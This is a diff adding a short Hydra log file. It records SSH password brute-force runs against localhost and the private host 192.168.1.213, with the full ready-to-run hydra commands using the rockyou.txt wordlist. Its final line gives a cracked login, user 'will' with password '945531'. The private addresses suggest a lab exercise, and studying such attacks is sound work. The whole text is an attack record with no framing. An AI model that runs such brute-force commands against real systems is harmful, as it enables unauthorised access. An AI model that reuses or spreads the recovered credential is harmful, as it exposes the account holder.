@@ -1,0 +1,3 @@
+# Hydra v9.5 run at 2024-12-11 16:39:14 on localhost ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://localhost:22)
+# Hydra v9.5 run at 2024-12-13 16:22:43 on 192.168.1.213 ssh (hydra -l will -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.213:22)
+[22][ssh] host: 192.168.1.213   login: will   password: 945531
